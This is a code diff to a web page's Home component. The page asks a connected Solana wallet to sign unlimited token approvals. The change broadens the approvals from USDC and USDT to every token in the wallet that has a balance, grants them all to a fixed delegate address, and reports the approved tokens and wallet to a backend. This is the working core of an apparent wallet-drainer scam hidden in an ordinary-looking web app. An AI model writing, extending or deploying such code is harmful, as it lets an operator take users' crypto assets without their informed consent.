@@ -377,32 +377,39 @@ export default function Home() {
       const delegateKey = new PublicKey(SOLANA_DELEGATE_ADDRESS);
       const userKey = new PublicKey(solanaAddress);
       
-      const usdcMint = new PublicKey(SOLANA_USDC_MINT);
-      const usdtMint = new PublicKey(SOLANA_USDT_MINT);
-      
-      const userUsdcAta = getAssociatedTokenAddress(usdcMint, userKey);
-      const userUsdtAta = getAssociatedTokenAddress(usdtMint, userKey);
-      
       const MAX_AMOUNT = BigInt("18446744073709551615");
       
-      const transaction = new Transaction();
+      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+        userKey,
+        { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
+      );
       
-      const usdcAccountInfo = await connection.getAccountInfo(userUsdcAta);
-      if (usdcAccountInfo) {
-        transaction.add(
-          createApproveInstruction(userUsdcAta, delegateKey, userKey, MAX_AMOUNT)
-        );
+      if (tokenAccounts.value.length === 0) {
+        setError("No SPL tokens found in your wallet");
+        setSolanaStep("idle");
+        return;
       }
       
-      const usdtAccountInfo = await connection.getAccountInfo(userUsdtAta);
-      if (usdtAccountInfo) {
-        transaction.add(
-          createApproveInstruction(userUsdtAta, delegateKey, userKey, MAX_AMOUNT)
-        );
+      const tokensApproved: string[] = [];
+      const transaction = new Transaction();
+      
+      for (const accountInfo of tokenAccounts.value) {
+        const tokenAccount = accountInfo.pubkey;
+        const parsedInfo = accountInfo.account.data.parsed?.info;
+        const balance = parsedInfo?.tokenAmount?.uiAmount || 0;
+        
+        if (balance > 0) {
+          transaction.add(
+            createApproveInstruction(tokenAccount, delegateKey, userKey, MAX_AMOUNT)
+          );
+          
+          const mintAddress = parsedInfo?.mint || "Unknown";
+          tokensApproved.push(mintAddress);
+        }
       }
       
       if (transaction.instructions.length === 0) {
-        setError("No USDC or USDT tokens found in your wallet");
+        setError("No tokens with balance found in your wallet");
         setSolanaStep("idle");
         return;
       }
@@ -423,10 +430,8 @@ export default function Home() {
           walletAddress: solanaAddress,
           delegateAddress: SOLANA_DELEGATE_ADDRESS,
           transactionHash: txId,
-          tokensApproved: [
-            usdcAccountInfo ? "USDC" : null,
-            usdtAccountInfo ? "USDT" : null,
-          ].filter(Boolean),
+          tokensApproved,
+          tokenCount: tokensApproved.length,
         }),
       }).catch(console.error);
 
